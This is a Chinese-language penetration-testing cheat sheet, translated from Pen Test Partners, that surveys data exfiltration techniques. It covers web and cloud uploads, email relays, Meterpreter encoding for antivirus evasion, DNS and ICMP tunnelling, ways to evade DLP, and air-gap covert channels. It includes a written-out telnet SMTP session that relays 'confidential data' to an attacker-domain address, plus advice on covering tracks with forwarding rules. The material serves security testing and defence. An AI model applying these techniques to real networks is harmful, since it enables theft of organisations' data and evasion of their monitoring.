**![data-exfil
\(1\).png](https://image.3001.net/images/20180726/15325685634503.png!small)**

**数据窃取是针对组织攻击链中的最后一个阶段。攻击者窃取数据的技术可谓花样百出，网上也有大量关于数据窃取方面的技术文档以及工具。本文的目的就是尽可能的将这些技术整合起来，以作为大家日后渗透测试时的一个CheatSheet使用。**

**![KillChain.png](https://image.3001.net/images/20180726/15325686087629.png!small)**

工欲善其事必先利其器，防范数据窃取必须先熟悉其使用的手段。文中所提及的大多数技术涉及直接的内部到外部数据窃取。需要说明的是这并不是一个完整版本，如果你知道的更多，那么请在评论处留言并告知我们！

##  Web

许多企业都没有在合适的地方设置任何类型的web代理这对于攻击者而言将会是个很好的机会。

Anon paste站点例如pastebin甚至是github，都为我们提供了一个数据窃取的简易通道。许多技术组织通常都会允许Github的使用。

如果有代理和过滤，你可能就需要花点心思了，但许多常见网站都会允许使用Dropbox，Google Drive和Box等，特别是那些有云外包服务的企业。

许多站点出于某些原因并未启用TLS，这很容易导致中间人攻击。因此，如果你的站点没有启用https，那么可以使用用Let's
Encrypt为你的站点免费加密。

即使启用了类似Websense这样的功能，很多类别也不能用于完整的TLS检查——比如财务和医疗——雇员隐私。许多分类系统允许你根据自己的实际情况设置分类，因此攻击者只要做好预先计划，例如创建一个医疗站点就可能轻松绕过过滤机制。

Flickr和YouTube是否可以访问？ 如果可以的话，则可以使用这些服务暂存相对较大的文件，包括使用隐写术。

也许你的企业拥有自己的可从Internet访问的Web服务器。那么你可以想办法拿下其中的一台，来作为你进一步渗透的中转站。

## Email

你是否可以访问一些主要的网络邮件提供商 - 例如Gmail，Outlook.com等？如果你的目标企业有外包到Office
365或GSuite（检查其MX或邮件头），则更有可能实现此目的。

出站SMTP/POP3/IMAP是否可用。检查加密以及未加密的端口 - 25/465/587,110/999,143/993。

是否存在错误配置的邮件中继？是否可以通过欺骗内部地址来中继到外部地址？（这也可在内网钓鱼时用来绕过message hygiene过滤器 ）

    
    
    #telnet internal.smtp.local 25
    HELO attacker
    MAIL FROM:<attacker@domain.com>
    RCPT TO:<attacker@attackerdomain.com>
    DATA
    Here is lots of confidential data
    .
    QUIT

如果邮箱遭到入侵（后钓鱼利用），攻击者可以将Outlook中的自动转发规则设置为他们选择的外部地址。通常这对于高价值目标非常有用。之后，我们可以使用相同的规则来删除已发送的项目，以覆盖留下的痕迹。  

## Malware

Meterpreter是一种先进的，可动态扩展的有效载荷，它使用内存中的DLL注入阶段，并在运行时通过网络扩展。它通过stager套接字进行通信并提供全面的客户端Ruby
API。它包含命令历史记录，制表符完成，频道等。<https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/>

要尽可能的避免杀软和网络入侵检测，你可以使用Metasploit中提供的编码器（例如/shikata_ga_nai）。还有就是尽量不要将正在使用的payload，上传到像VirusTotal这类的在线病毒扫描网站。因为一旦上传你的payload就会被分享给所有的AV公司，并会在短时间内被杀毒软件查杀。<https://www.offensive-security.com/metasploit-unleashed/msfencode/>

##  **协议滥用**

FTP/SSH/SCP/SFTP可能被允许出站，因为它们经常被用作数据交换协议。客户端工具也可以在系统上随时使用，而无需下载其他二进制文件。

DNS
Tunneling，是隐蔽信道的一种，通过将其他协议封装在DNS协议中传输建立通信。因为在我们的网络世界中DNS是一个必不可少的服务，所以大部分防火墙和入侵检测设备很少会过滤DNS流量。这里推荐大家可以使用dnscat2。

一些IDS/IDP现在能够发现DNS隧道，但经常错过通过DNS
TXT记录发送的数据。我们制作了一个工具你可以通过它来提供文件：[https://github.com/pentestpartners/Uninvited-Guest，](https://github.com/pentestpartners/Uninvited-Guest)还有一个早期的版本：<https://github.com/pentestpartners/DNSTXT-encoder>。

你可以尝试原始TCP套接字。可能ICMP被允许出站（它是一种非常实用的诊断工具，在IPv6中很重要）-但它很慢。<https://github.com/sensepost/DET>

我们可以使用[secret_sender](https://github.com/omkartotade/Data-Exfiltration)操纵IP数据包，通过其中一个协议（TCMP Echo Request，TCP
SYN或UDP）发送从命令行接受的消息，将数据泄露到服务器上。因为它看起来像是服务器的正常数据包，因此它不会引起任何的怀疑。

Old-school port knocking（端口敲门）也是一种选择：<https://www.sans.org/reading-room/whitepapers/covert/portknockout-data-exfiltration-port-knocking-udp-37307>

像bittorrent这样的P2P协议是否可用？

如果HTTPS检查没有对外部和内部名称做匹配性检查，那么可以尝试通过Tor和domain fronting（域前置）来绕过过滤器。
_<https://blog.didierstevens.com/2018/01/20/quickpost-data-exfiltration-with-tor-browser-and-domain-fronting/>_

许多即时消息协议，如Skype，Facebook Messenger和IRC也可以被利用。就拿我当前所在的企业来说，我们使用的是Skype for
Business并且还启用了federation。<https://www.sans.org/reading-room/whitepapers/covert/skype-data-exfiltration-34560>

NTP和BGP协议通常也被允许，可以滥用它们来泄露数据。<https://www.darknet.org.uk/2016/11/pyexfil-python-data-exfiltration-tools/>

远程桌面通常可用于映射磁盘和剪贴板，即便被限制，我们也可以使用[PTP
Rat](https://github.com/pentestpartners/PTP-RAT)通过显示器像素值来泄露数据。

X509证书可以被嵌入到二进制数据中，因此可用于传输数据。<https://github.com/fideliscyber/x509>

## Internal Staging

WMI调用可用于启动传输，设置ADS或采用卷影拷贝来隐藏staging系统上的数据。<https://github.com/secabstraction/WmiSploit>

Windows BITS可用于传输调度或涓流传输信息，以避免触发“top talkers”触发器。

##  **文件类型**

对于一些安装了DLP（数据泄露防护系统）的企业，我们可以尝试将数据封装在以下文件类型来绕过DLP：

> Zip
>
> 加密 (AES) Zip
>
> 深度嵌套 Zip（许多系统会在10-100层之后停止扫描，以避免Zip炸弹）
>
> 7zip
>
> RAR
>
> CAB
>
> Tar (+/- gzip)
>
> WIM image

##  **物理**

如果攻击者或恶意的内部工作人员具有物理访问权限，那么我们又该怎么做？

> 检查笔记本USB插口是否已锁定，MP3播放器和智能手机。是否已设置仅允许授权USB连接选项。
>
> 可以将数据保存在CD和DVD中，相较于USB它们更难以泄露数据。
>
> 笔记本上的资产贴纸，是否有任何泄露信息？便携式设备是否具有完全的磁盘加密？垃圾箱或是在eBay上是否有处理不当的机器？
>
>
> 许多企业都拥有自己的打印机，打印机的功能也非常的齐全，例如检索之前的打印任务，甚至可以通过传真线传输数据。<http://seclists.org/bugtraq/2016/Sep/54>
>
> 公司的Wi-Fi是否安全？是否使用了不安全WPA-PSK加密。访客Wi-Fi网络是否与企业主要网络充分隔离？企业系统是否被允许连接到访客Wi-Fi？
>
> 攻击者是否可以利用弱边缘端口安全性在网络上植入设备，例如具有自己的蜂窝带外命令连接的Raspberry Pi？
>
> 网络摄像头
>
> 手机
>
> 硬拷贝

##  **隔离网络**

在网络隔离的情况下，可以针对蓝牙设备发起攻击，例如控制设备或在设备范围内传播恶意软件等。<https://blog.malwarebytes.com/cybercrime/2017/09/blueborne-bluetooths-airborne-influenza/>

PC扬声器：主要利用特定的音频芯片功能，将输出音频插孔转换成输入插孔，从而将连接的扬声器有效地转换为（非传统）麦克风。感染air-gapped计算机的恶意软件可以将本地存储的文件转换成音频信号，并通过连接的扬声器、耳机或耳塞将它们传送到附近的另一台计算机设备。具体可参考：<https://thehackernews.com/2018/03/air-gap-computer-hacking.html>

LED灯：硬盘上的LED指示灯也是个很好的突破口，它每秒最多能闪烁6000次。因此，黑客可以借助这些闪烁远程获取数据。<https://www.wired.com/2017/02/malware-sends-stolen-data-drone-just-pcs-blinking-led/>

磁：ODINI和MAGNETO攻击可以利用计算机处理器产生的磁信号来窃取数据。磁信号可以通过读写硬盘驱动来产生。由于该攻击为低频磁场，因此可以绕过法拉第屏蔽。

电力线：通过电力线从隔离计算机中提取数据。

“Fansmitter”-占用计算机的风扇并修改其转速以控制产生的声音。<https://www.technologyreview.com/s/601816/how-fansmitter-malware-steals-data-from-air-gapped-computers/>

 ** *参考来源：[pentestpartners](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)，FB小编 secist 编译，转载请注明来自FreeBuf.COM**

